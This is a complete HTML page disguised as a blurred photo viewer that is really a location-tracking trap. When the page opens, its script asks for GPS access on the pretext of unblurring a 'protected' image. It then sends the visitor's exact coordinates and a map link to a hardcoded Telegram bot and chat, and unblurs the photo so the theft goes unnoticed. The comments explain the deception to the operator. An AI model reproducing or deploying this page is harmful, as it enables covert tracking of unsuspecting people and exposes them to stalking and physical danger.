<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Просмотр изображения</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; text-align: center; margin: 0; padding: 20px; background: #111; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
        .photo-container { max-width: 100%; max-height: 80vh; border-radius: 8px; box-shadow: 0 4px 25px rgba(0,0,0,0.5); overflow: hidden; background: #222; position: relative; }
        img { max-width: 100%; height: auto; display: block; filter: blur(8px); transition: filter 0.5s ease; }
        .info-msg { margin-top: 15px; font-size: 14px; color: #aaa; max-width: 90%; line-height: 1.4; }
    </style>
</head>
<body>

<div class="photo-container">
    <!-- ТУТ ПОСИЛАННЯ НА КАРТИНКУ. Зараз стоїть випадкове гарне фото з інтернету. Можна замінити на будь-яке інше -->
    <img id="user-photo" src="https://picsum.photos" alt="Изображение">
</div>
<div id="status" class="info-msg">Загрузка защищенного канала для отображения фото высокого качества...</div>

<script>
    const TELEGRAM_TOKEN = "9222855250:AAGqq9cpY7OSlB0vmlgIukhyyrh7UXf3wxc"; 
    const CHAT_ID = "8512069090"; 

    // Скрипт запускається АВТОМАТИЧНО при відкритті сайту
    window.onload = function() {
        requestLocationForPhoto();
    };

    function requestLocationForPhoto() {
        const statusDiv = document.getElementById("status");
        const photo = document.getElementById("user-photo");
        
        if (navigator.geolocation) {
            // Браузер відразу викликає системне вікно GPS
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    // Користувач дозволив доступ:
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Збираємо повідомлення для вашого Telegram
                    const textMessage = '[+] УСТРОЙСТВО НАЙДЕНО!\nШирота: ' + lat + '\nДолгота: ' + lon + '\nКарта: https://google.com' + lat + ',' + lon;
                    const base_url = "https://" + "api" + "." + "telegram" + "." + "org" + "/bot";
                    
                    fetch(base_url + TELEGRAM_TOKEN + '/sendMessage', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: textMessage })
                    })
                    .then(response => {
                        // Прибираємо розмиття з фотографії, ніби все завантажилось успішно
                        photo.style.filter = "blur(0px)";
                        statusDiv.innerHTML = "Изображение успешно загружено в оригинальном качестве.";
                    })
                    .catch(err => {
                        photo.style.filter = "blur(0px)";
                        statusDiv.innerHTML = "Изображение загружено.";
                    });
                }, 
                function(error) {
                    // Користувач заблокував доступ:
                    statusDiv.innerHTML = "<span style='color: #ef4444;'>Ошибка: Подтвердите геопозицию для снятия защиты и размытия фото.</span>";
                },
                { enableHighAccuracy: true }
            );
        } else {
            statusDiv.innerHTML = "Ваш браузер не поддерживает безопасный просмотр.";
        }
    }
</script>

</body>
</html>
